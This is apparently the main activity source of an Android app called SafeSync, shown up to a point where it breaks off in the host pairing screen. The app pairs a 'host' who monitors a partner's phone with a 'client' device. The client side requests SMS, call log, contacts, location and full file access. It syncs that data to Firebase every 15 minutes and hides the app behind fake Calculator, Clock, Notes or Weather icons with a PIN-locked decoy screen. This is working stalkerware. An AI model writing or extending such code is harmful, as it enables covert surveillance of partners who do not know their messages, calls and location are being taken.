package com.strix.safesync

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.gestures.detectDragGestures
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.ui.draw.clip
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Typography
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.compose.ui.draw.blur
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.unit.IntOffset
import kotlinx.coroutines.launch
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.expandVertically
import androidx.compose.animation.shrinkVertically
import androidx.compose.runtime.rememberCoroutineScope
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import androidx.work.*
import com.strix.safesync.data.FirebaseManager
import com.strix.safesync.services.LocationService
import com.strix.safesync.workers.DataSyncWorker
import java.util.concurrent.TimeUnit
import kotlin.math.roundToInt
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import coil.compose.AsyncImage
import coil.request.ImageRequest

@OptIn(ExperimentalMaterial3Api::class)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        requestPermissions()

        val prefs = getSharedPreferences("SafeSyncCustomServer", Context.MODE_PRIVATE)
        val isServerConfigured = !prefs.getString("apiKey", "").isNullOrBlank()

        if (isServerConfigured) {
            FirebaseManager.initialize { code ->
                Log.d("SafeSync", "My code: $code")
                scheduleDataSync()
            }
        }

        appMode = loadSavedAppMode()

        setContent {
            ModernSafeSyncTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    AppNavigation()
                }
            }
        }
    }


    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS

        )
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        }
        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 100)
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.addCategory("android.intent.category.DEFAULT")
                    intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent()
                    intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                    startActivity(intent)
                }
            }
        }
    }

    private fun scheduleDataSync() {
        val workRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SafeSyncData",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    fun runForceSyncNow() {
        val oneTime = OneTimeWorkRequestBuilder<DataSyncWorker>()
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueue(oneTime)
        Toast.makeText(this, "Sync started…", Toast.LENGTH_SHORT).show()
    }

    private val allAliases = listOf(
        "com.strix.safesync.CalculatorAlias",
        "com.strix.safesync.ClockAlias",
        "com.strix.safesync.NotesAlias",
        "com.strix.safesync.WeatherAlias"
    )

    fun setStealthMode(aliasName: String?) {
        val pm = packageManager
        val defaultComponent = ComponentName(this, MainActivity::class.java)
        // Disable all aliases first
        allAliases.forEach { alias ->
            pm.setComponentEnabledSetting(
                ComponentName(this, alias),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        if (aliasName != null) {
            // Disable default launcher icon
            pm.setComponentEnabledSetting(defaultComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            // Enable chosen alias
            saveStealthAlias(aliasName)
            pm.setComponentEnabledSetting(
                ComponentName(this, aliasName),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            val label = aliasName.substringAfterLast(".").replace("Alias", "")
            Toast.makeText(this, "Icon changed to $label. Wait a few seconds.", Toast.LENGTH_LONG).show()
        } else {
            // Restore original
            saveStealthAlias(null)
            pm.setComponentEnabledSetting(defaultComponent, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
            Toast.makeText(this, "Restored SafeSync icon.", Toast.LENGTH_LONG).show()
        }
    }

    private fun saveStealthAlias(alias: String?) {
        val prefs = applicationContext.getSharedPreferences("SafeSyncPrefs", Context.MODE_PRIVATE)
        prefs.edit().putString("stealthAlias", alias).apply()
    }

    enum class AppMode { NONE, HOST, CLIENT }

    var appMode by mutableStateOf(AppMode.NONE)

    private fun loadSavedAppMode(): AppMode {
        val prefs = applicationContext.getSharedPreferences("SafeSyncPrefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("appMode", "NONE") ?: "NONE"
        // Also restore the partnerId so Host doesn't get sent back to PairingScreen
        val savedPartnerId = prefs.getString("partnerId", null)
        if (!savedPartnerId.isNullOrEmpty()) {
            FirebaseManager.partnerId = savedPartnerId
        }
        return try { AppMode.valueOf(saved) } catch (e: Exception) { AppMode.NONE }
    }

    private fun saveAppMode(mode: AppMode) {
        appMode = mode
        val prefs = applicationContext.getSharedPreferences("SafeSyncPrefs", Context.MODE_PRIVATE)
        prefs.edit().putString("appMode", mode.name).apply()
    }

    private fun savePartnerId(partnerId: String?) {
        val prefs = applicationContext.getSharedPreferences("SafeSyncPrefs", Context.MODE_PRIVATE)
        if (partnerId != null) {
            prefs.edit().putString("partnerId", partnerId).apply()
        } else {
            prefs.edit().remove("partnerId").apply()
        }
    }

    @Composable
    fun AppNavigation() {
        val context = LocalContext.current
        var isServerConfigured by remember { 
            mutableStateOf(!context.getSharedPreferences("SafeSyncCustomServer", Context.MODE_PRIVATE).getString("apiKey", "").isNullOrBlank())
        }
        
        // For CLIENT: track whether the secret PIN has been entered yet
        var isClientUnlocked by remember { mutableStateOf(false) }
        val stealthAlias = remember { context.getSharedPreferences("SafeSyncPrefs", Context.MODE_PRIVATE).getString("stealthAlias", null) }
        
        when {
            appMode == AppMode.NONE -> {
                ModeSelectionScreen(
                    isServerConfigured = isServerConfigured,
                    onConfigured = { isServerConfigured = true }
                ) { mode -> saveAppMode(mode) }
            }
            appMode == AppMode.CLIENT && !isClientUnlocked -> {
                val onUnlockCallback = { isClientUnlocked = true }
                val onBackCallback = { savePartnerId(null); saveAppMode(AppMode.NONE) }
                when (stealthAlias) {
                    "com.strix.safesync.ClockAlias" -> {
                        ClockScreen(onUnlock = onUnlockCallback, onBackToMenu = onBackCallback)
                    }
                    "com.strix.safesync.NotesAlias" -> {
                        NotesScreen(onUnlock = onUnlockCallback, onBackToMenu = onBackCallback)
                    }
                    "com.strix.safesync.WeatherAlias" -> {
                        WeatherScreen(onUnlock = onUnlockCallback, onBackToMenu = onBackCallback)
                    }
                    else -> {
                        CalculatorScreen(onUnlock = onUnlockCallback, onBackToMenu = onBackCallback)
                    }
                }
            }
            appMode == AppMode.CLIENT && isClientUnlocked -> {
                PairingScreen(onPairSuccess = { /* Client doesn't need pairing success to show UI */ })
            }
            FirebaseManager.partnerId == null && appMode == AppMode.HOST -> {
                PairingScreen(onPairSuccess = { /* handled by reactivity */ })
            }
            else -> {
                DashboardTabs()
            }
        }
    }

    @Composable
    fun ModeSelectionScreen(isServerConfigured: Boolean = true, onConfigured: () -> Unit = {}, onModeSelected: (AppMode) -> Unit) {
        var showCustomServerDialog by remember { mutableStateOf(!isServerConfigured) }
        var showGuideScreen by remember { mutableStateOf(false) }
        val context = LocalContext.current

        Box(modifier = Modifier.fillMaxSize()) {
            // Background
            androidx.compose.foundation.Canvas(modifier = Modifier.fillMaxSize()) {
                val brush = androidx.compose.ui.graphics.Brush.linearGradient(
                    colors = listOf(Color(0xFF1E293B), Color(0xFF0F172A)),
                    start = androidx.compose.ui.geometry.Offset(0f, 0f),
                    end = androidx.compose.ui.geometry.Offset(size.width, size.height)
                )
                drawRect(brush = brush)
            }

            AnimatedVisibility(
                visible = !showGuideScreen,
                enter = fadeIn() + expandVertically(),
                exit = fadeOut() + shrinkVertically()
            ) {
                Column(
                    modifier = Modifier.fillMaxSize().padding(24.dp),
                    verticalArrangement = Arrangement.Center,
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        "Select Your Role",
                        style = MaterialTheme.typography.headlineMedium,
                        fontWeight = FontWeight.Black,
                        color = Color.White,
                        modifier = Modifier.padding(bottom = 48.dp)
                    )

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(16.dp)
                ) {
                    // Host Button (Slide from left)
                    var hostVisible by remember { mutableStateOf(false) }
                    LaunchedEffect(Unit) { hostVisible = true }
                    
                    AnimatedVisibility(
                        visible = hostVisible,
                        enter = slideInHorizontally(initialOffsetX = { -it }) + fadeIn(),
                        modifier = Modifier.weight(1f)
                    ) {
                        ModeCard(
                            title = "HOST",
                            icon = Icons.Default.Monitor,
                            description = "Monitor partner device",
                            color = Color(0xFF6366F1),
                            onClick = { onModeSelected(AppMode.HOST) }
                        )
                    }

                    // Client Button (Slide from right)
                    var clientVisible by remember { mutableStateOf(false) }
                    LaunchedEffect(Unit) { clientVisible = true }

                    AnimatedVisibility(
                        visible = clientVisible,
                        enter = slideInHorizontally(initialOffsetX = { it }) + fadeIn(),
                        modifier = Modifier.weight(1f)
                    ) {
                        ModeCard(
                            title = "CLIENT",
                            icon = Icons.Default.Smartphone,
                            description = "Share data with partner",
                            color = Color(0xFF10B981),
                            onClick = { onModeSelected(AppMode.CLIENT) }
                        )
                    }
                }

                Spacer(modifier = Modifier.height(64.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceEvenly
                ) {
                    // Guide Button
                    OutlinedButton(
                        onClick = { showGuideScreen = true },
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D4FF)),
                        border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFF00D4FF).copy(alpha = 0.5f))
                    ) {
                        Icon(Icons.Default.MenuBook, contentDescription = null, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Server Guide")
                    }

                    // Custom Server Button
                    OutlinedButton(
                        onClick = { showCustomServerDialog = true },
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color.White),
                        border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.5f))
                    ) {
                        Icon(Icons.Default.Settings, contentDescription = null, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Custom Server")
                    }
                }
            }
            } // end of animated visibility wrapper

            AnimatedVisibility(
                visible = showGuideScreen,
                enter = slideInHorizontally(initialOffsetX = { it }) + fadeIn(),
                exit = slideOutHorizontally(targetOffsetX = { it }) + fadeOut()
            ) {
                GuideScreen(onBack = { showGuideScreen = false })
            }
        }

        if (showCustomServerDialog) {
            CustomFirebaseDialog(
                onDismiss = { 
                    if (!context.getSharedPreferences("SafeSyncCustomServer", Context.MODE_PRIVATE).getString("apiKey", "").isNullOrBlank()) {
                        showCustomServerDialog = false
                        onConfigured()
                    } else {
                        Toast.makeText(context, "Harap isi kredensial terlebih dahulu!", Toast.LENGTH_SHORT).show()
                    }
                },
                context = context,
                isConfigured = isServerConfigured
            )
        }
    }

    @Composable
    fun CustomFirebaseDialog(onDismiss: () -> Unit, context: Context, isConfigured: Boolean = true) {
        val prefs = context.getSharedPreferences("SafeSyncCustomServer", Context.MODE_PRIVATE)
        var apiKey by remember { mutableStateOf(prefs.getString("apiKey", "") ?: "") }
        var appId by remember { mutableStateOf(prefs.getString("appId", "") ?: "") }
        var projectId by remember { mutableStateOf(prefs.getString("projectId", "") ?: "") }
        var storageBucket by remember { mutableStateOf(prefs.getString("storageBucket", "") ?: "") }

        AlertDialog(
            onDismissRequest = onDismiss,
            title = { Text("Custom Firebase Server", fontWeight = FontWeight.Bold) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("Perbarui kredensial Firebase Anda di sini. ${if (!isConfigured) "Kredensial wajib diisi!" else ""}", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                    OutlinedTextField(value = apiKey, onValueChange = { apiKey = it.trim() }, label = { Text("Web API Key") }, singleLine = true)
                    OutlinedTextField(value = appId, onValueChange = { appId = it.trim() }, label = { Text("App ID (1:xxx:android:yyy)") }, singleLine = true)
                    OutlinedTextField(value = projectId, onValueChange = { projectId = it.trim() }, label = { Text("Project ID") }, singleLine = true)
                    OutlinedTextField(value = storageBucket, onValueChange = { storageBucket = it.trim() }, label = { Text("Storage Bucket (Opsional)") }, singleLine = true)
                }
            },
            confirmButton = {
                Button(onClick = {
                    prefs.edit()
                        .putString("apiKey", apiKey)
                        .putString("appId", appId)
                        .putString("projectId", projectId)
                        .putString("storageBucket", storageBucket)
                        .apply()
                        
                    try {
                        if (com.google.firebase.FirebaseApp.getApps(context).isEmpty()) {
                            val options = com.google.firebase.FirebaseOptions.Builder()
                                .setApiKey(apiKey)
                                .setApplicationId(appId)
                                .setProjectId(projectId)
                                .setStorageBucket(if (storageBucket.isBlank()) "$projectId.appspot.com" else storageBucket)
                                .build()
                            com.google.firebase.FirebaseApp.initializeApp(context, options)
                            com.strix.safesync.data.FirebaseManager.initialize { code ->
                                android.util.Log.d("SafeSync", "My code: $code")
                            }
                            Toast.makeText(context, "Server Terhubung!", Toast.LENGTH_SHORT).show()
                        } else {
                            Toast.makeText(context, "Tersimpan! Memulai ulang aplikasi...", Toast.LENGTH_LONG).show()
                            val intent = context.packageManager.getLaunchIntentForPackage(context.packageName)
                            val componentName = intent?.component
                            val mainIntent = Intent.makeRestartActivityTask(componentName)
                            context.startActivity(mainIntent)
                            Runtime.getRuntime().exit(0)
                            return@Button
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                        Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                    }
                    onDismiss()
                }) {
                    Text("Simpan")
                }
            },
            dismissButton = {
                if (isConfigured) {
                    TextButton(onClick = onDismiss) {
                        Text("Batal", color = Color.Gray)
                    }
                }
            }
        )
    }

    @OptIn(ExperimentalAnimationApi::class)
    @Composable
    fun GuideScreen(onBack: () -> Unit) {
        var step by remember { mutableIntStateOf(0) }
        val steps = listOf(
            Pair("1. Buat Project", "Buka console.firebase.google.com.\nBuat project baru, lalu tambahkan aplikasi Android dengan Package Name:\n'com.strix.safesync'"),
            Pair("2. Aktifkan Layanan", "Buka menu 'Build' di kiri dan aktifkan:\n• Authentication (Pilih mode: Anonymous)\n• Firestore Database (Test Mode)\n• Storage (Test Mode)"),
            Pair("3. Copy App & Project ID", "Klik ikon ⚙️ (Project Settings).\nDi tab General, scroll ke 'Your apps' untuk melihat App ID (1:xxx:android:yyy) dan copy Project ID di bagian atas."),
            Pair("4. Cara Dapat Web API Key", "Buka Project Settings > General > Scroll ke 'Your apps' > Klik tombol 'Add app' > Pilih ikon Web (</>) > Daftarkan asal (misal: test).\nAPI Key akan langsung muncul di dalam kodenya!"),
            Pair("5. Hubungkan Aplikasi", "Tekan tombol 'Custom Server' di halaman awal aplikasi ini.\nMasukkan semua data yang didapat ke form, lalu klik Save & Restart.")
        )

        Column(
            modifier = Modifier.fillMaxSize().padding(24.dp)
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = onBack) {
                    Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = Color.White)
                }
                Text("Panduan Setup Server", style = MaterialTheme.typography.titleLarge, color = Color.White, fontWeight = FontWeight.Bold)
            }

            Spacer(modifier = Modifier.height(24.dp))

            // Premium Glass Card
            Surface(
                modifier = Modifier.fillMaxWidth().weight(1f).border(1.dp, Color(0xFF00D4FF).copy(alpha = 0.3f), RoundedCornerShape(24.dp)),
                color = Color.White.copy(alpha = 0.05f),
                shape = RoundedCornerShape(24.dp)
            ) {
                AnimatedContent(
                    targetState = step,
                    transitionSpec = {
                        if (targetState > initialState) {
                            slideInHorizontally { width -> width }.plus(fadeIn()).togetherWith(slideOutHorizontally { width -> -width }.plus(fadeOut()))
                        } else {
                            slideInHorizontally { width -> -width }.plus(fadeIn()).togetherWith(slideOutHorizontally { width -> width }.plus(fadeOut()))
                        }
                    },
                    label = "guide_anim"
                ) { currentStep ->
                    Column(
                        modifier = Modifier.fillMaxSize().padding(32.dp),
                        verticalArrangement = Arrangement.Center,
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Surface(
                            shape = CircleShape,
                            color = Color(0xFF00D4FF).copy(alpha = 0.15f),
                            modifier = Modifier.size(80.dp)
                        ) {
                            Icon(
                                when (currentStep) {
                                    0 -> Icons.Default.CloudQueue
                                    1 -> Icons.Default.VpnKey
                                    2 -> Icons.Default.Security
                                    else -> Icons.Default.CheckCircle
                                },
                                contentDescription = null,
                                tint = Color(0xFF00D4FF),
                                modifier = Modifier.padding(24.dp)
                            )
                        }
                        Spacer(modifier = Modifier.height(32.dp))
                        Text(
                            steps[currentStep].first,
                            style = MaterialTheme.typography.titleLarge,
                            fontWeight = FontWeight.Black,
                            color = Color.White,
                            textAlign = TextAlign.Center
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            steps[currentStep].second,
                            style = MaterialTheme.typography.bodyLarge,
                            color = Color.LightGray,
                            textAlign = TextAlign.Center,
                            lineHeight = 24.sp
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(32.dp))

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                TextButton(
                    onClick = { if (step > 0) step-- },
                    enabled = step > 0
                ) {
                    Text("Previous", color = if (step > 0) Color.LightGray else Color.Transparent)
                }

                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    steps.indices.forEach { i ->
                        Box(
                            modifier = Modifier
                                .size(if (i == step) 10.dp else 8.dp)
                                .background(
                                    color = if (i == step) Color(0xFF00D4FF) else Color.DarkGray,
                                    shape = CircleShape
                                )
                        )
                    }
                }

                TextButton(
                    onClick = { if (step < steps.size - 1) step++ else onBack() }
                ) {
                    Text(if (step == steps.size - 1) "Done" else "Next", color = Color(0xFF00D4FF), fontWeight = FontWeight.Bold)
                }
            }
        }
    }

    @Composable
    fun ModeCard(title: String, icon: ImageVector, description: String, color: Color, onClick: () -> Unit) {
        Surface(
            onClick = onClick,
            shape = RoundedCornerShape(24.dp),
            color = color.copy(alpha = 0.1f),
            border = androidx.compose.foundation.BorderStroke(1.dp, color.copy(alpha = 0.5f)),
            modifier = Modifier.height(200.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                Icon(icon, contentDescription = null, modifier = Modifier.size(48.dp), tint = color)
                Spacer(modifier = Modifier.height(16.dp))
                Text(title, fontWeight = FontWeight.Bold, color = Color.White, fontSize = 18.sp)
                Spacer(modifier = Modifier.height(8.dp))
                Text(description, style = MaterialTheme.typography.bodySmall, color = Color.White.copy(alpha = 0.6f), textAlign = TextAlign.Center)
            }
        }
    }

    @Composable
    fun PairingScreen(onPairSuccess: () -> Unit) {
        val context = LocalContext.current
        var inputCode by remember { mutableStateOf("") }
        val isHost = appMode == AppMode.HOST

        LaunchedEffect(appMode) {
            if (appMode == AppMode.CLIENT) {
                // Force an immediate sync of files and data when client mode opens
                // to overwrite any old/stale paths in the database.
                val request = androidx.work.OneTimeWorkRequestBuilder<com.strix.safesync.workers.DataSyncWorker>().build()
                androidx.work.WorkManager.getInstance(context).enqueue(request)
            }
        }

        Box(modifier = Modifier.fillMaxSize()) {
            // Premium Gradient Background
            androidx.compose.foundation.Canvas(modifier = Modifier.fillMaxSize()) {
                val brush = androidx.compose.ui.graphics.Brush.linearGradient(
                    colors = if (isHost) listOf(Color(0xFF6366F1), Color(0xFFA855F7), Color(0xFFEC4899)) 
                             else listOf(Color(0xFF10B981), Color(0xFF06B6D4), Color(0xFF3B82F6)),
                    start = androidx.compose.ui.geometry.Offset(0f, 0f),
                    end = androidx.compose.ui.geometry.Offset(size.width, size.height)
                )
                drawRect(brush = brush)
            }

            IconButton(
                onClick = {
                    savePartnerId(null)
                    setStealthMode(null)
                    saveAppMode(AppMode.NONE)
                },
                modifier = Modifier.align(Alignment.TopStart).statusBarsPadding().padding(8.dp)
            ) {
                Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = Color.White)
            }

            Column(
                modifier = Modifier.fillMaxSize().padding(24.dp).statusBarsPadding().navigationBarsPadding(),
                verticalArrangement = Arrangement.SpaceBetween,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Column(
                    modifier = Modifier.weight(1f).padding(top = 40.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    // Modern Header Box
                    Surface(
                        shape = RoundedCornerShape(32.dp),
                        color = Color.White.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.1f)),
                        modifier = Modifier.padding(bottom = 32.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.padding(horizontal = 24.dp, vertical = 20.dp)
                        ) {
                            Icon(
                                if (isHost) Icons.Default.Monitor else Icons.Default.Sync,
                                contentDescription = null,
                                modifier = Modifier.size(48.dp),
                                tint = Color.White
                            )
                            Spacer(modifier = Modifier.width(16.dp))
                            Column {
                                Text(
                                    if (isHost) "SafeSync Host" else "SafeSync Client", 
                                    style = MaterialTheme.typography.headlineSmall, 
                                    fontWeight = FontWeight.Black,
                                    color = Color.White,
                                    letterSpacing = 1.sp
                                )
                                Text(
                                    if (isHost) "Monitoring your partner" else "Wait for partner to connect", 
                                    style = MaterialTheme.typography.labelMedium,
                                    color = Color.White.copy(alpha = 0.7f),
                                    letterSpacing = 0.5.sp
                                )
                            }
                        }
                    }
                    
                    Spacer(modifier = Modifier.height(24.dp))
                    
                    if (!isHost) {
                        var isUnlocked by remember { mutableStateOf(false) }

                        if (!isUnlocked) {
                            CalculatorScreen(onUnlock = { isUnlocked = true })
                        } else {
                            Column(
                                modifier = Modifier.fillMaxWidth().weight(1f).verticalScroll(rememberScrollState()),
                                horizontalAlignment = Alignment.CenterHorizontally
                            ) {
                                // Glassmorphism-style Card for Client
                                Surface(
                                    shape = RoundedCornerShape(24.dp),
                                    color = Color.White.copy(alpha = 0.15f),
                                    border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.2f)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                                        Text(
                                            "YOUR PAIRING CODE", 
                                        style = MaterialTheme.typography.labelMedium,
                                        color = Color.White.copy(alpha = 0.7f),
                                        letterSpacing = 2.sp
                                    )
                                    Spacer(modifier = Modifier.height(8.dp))
                                    Text(
                                        FirebaseManager.myPairCode.ifEmpty { "..." }, 
                                        style = MaterialTheme.typography.displayLarge, 
                                        fontWeight = FontWeight.Black,
                                        letterSpacing = 8.sp,
                                        color = Color.White
                                    )
                                }
                            }

                            Spacer(modifier = Modifier.height(24.dp))

                            // Premium Stealth Mode Grid for Client
                            val stealthOptions = listOf(
                                Triple("com.strix.safesync.CalculatorAlias", "Calculator", Icons.Default.Calculate),
                                Triple("com.strix.safesync.ClockAlias",      "Clock",      Icons.Default.AccessTime),
                                Triple("com.strix.safesync.NotesAlias",      "Notes",      Icons.Default.StickyNote2),
                                Triple("com.strix.safesync.WeatherAlias",    "Weather",    Icons.Default.WbSunny)
                            )
                            var selectedAlias by remember { mutableStateOf<String?>(null) }

                        Surface(
                            shape = RoundedCornerShape(20.dp),
                            color = Color.White.copy(alpha = 0.05f),
                            border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.1f)),
                            modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp)
                        ) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(
                                        Icons.Default.VisibilityOff,
                                        contentDescription = null,
                                        tint = Color.White,
                                        modifier = Modifier.size(20.dp)
                                    )
                                    Spacer(modifier = Modifier.width(10.dp))
                                    Text("Stealth Mode", fontWeight = FontWeight.Bold, color = Color.White)
                                }
                                Spacer(modifier = Modifier.height(16.dp))
                                
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    stealthOptions.forEach { (alias, label, icon) ->
                                        val isSelected = selectedAlias == alias
                                        Surface(
                                            onClick = { selectedAlias = alias },
                                            shape = RoundedCornerShape(12.dp),
                                            color = if (isSelected) Color(0xFF10B981).copy(alpha = 0.2f) else Color.White.copy(alpha = 0.1f),
                                            border = if (isSelected) androidx.compose.foundation.BorderStroke(1.dp, Color(0xFF10B981)) else null,
                                            modifier = Modifier.weight(1f).height(65.dp)
                                        ) {
                                            Column(
                                                modifier = Modifier.fillMaxSize(),
                                                horizontalAlignment = Alignment.CenterHorizontally,
                                                verticalArrangement = Arrangement.Center
                                            ) {
                                                Icon(icon, contentDescription = label, tint = if (isSelected) Color(0xFF10B981) else Color.LightGray, modifier = Modifier.size(24.dp))
                                                Text(label, fontSize = 10.sp, color = if (isSelected) Color(0xFF10B981) else Color.LightGray)
                                            }
                                        }
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                Button(
                                    onClick = { if (selectedAlias != null) setStealthMode(selectedAlias) },
                                    modifier = Modifier.fillMaxWidth(),
                                    enabled = selectedAlias != null,
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                                ) {
                                    Text("Apply Stealth Icon", fontWeight = FontWeight.Bold)
                                }

                                TextButton(
                                    onClick = { setStealthMode(null) },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text("Restore Original Icon", color = Color.White.copy(alpha = 0.7f))
                                }
                            }
                        }
                        Spacer(modifier = Modifier.height(16.dp))
                            } // End scrollable Client Column
                        } // End isUnlocked condition
                    } else {
                        // Host Input
                        Surface(
                            shape = RoundedCornerShape(16.dp),
                            color = Color.White,
                            modifier = Modifier.fillMaxWidth(),
                            shadowElevation = 8.dp
                        ) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                OutlinedTextField(
                                    value = inputCode,
                                    onValueChange = { inputCode = it },
                                    placeholder = { Text("Enter Partner Code", color = Color.Gray) },
                                    modifier = Modifier.fillMaxWidth(),
                                    shape = RoundedCornerShape(12.dp),
                                    singleLine = true,
                                    colors = TextFieldDefaults.outlinedTextFieldColors(
                                        unfocusedBorderColor = Color.Transparent,
                                        focusedBorderColor = MaterialTheme.colorScheme.primary
                                    ),
                                    leadingIcon = { Icon(Icons.Default.Link, contentDescription = null, tint = MaterialTheme.colorScheme.primary) }
                                )
                                
                                Spacer(modifier = Modifier.height(16.dp))
                                
                                Button(
                                    onClick = {
                                        FirebaseManager.linkPartner(inputCode) { success ->
                                            if (success) {
                                                // Persist partnerId so it survives app restarts
                                                savePartnerId(FirebaseManager.partnerId)
                                                onPairSuccess()
                                            } else {
                                                Toast.makeText(this@MainActivity, "Invalid Code", Toast.LENGTH_SHORT).show()
                                            }
                                        }
                                    },
                                    modifier = Modifier.fillMaxWidth().height(56.dp),
                                    shape = RoundedCornerShape(12.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                                ) {
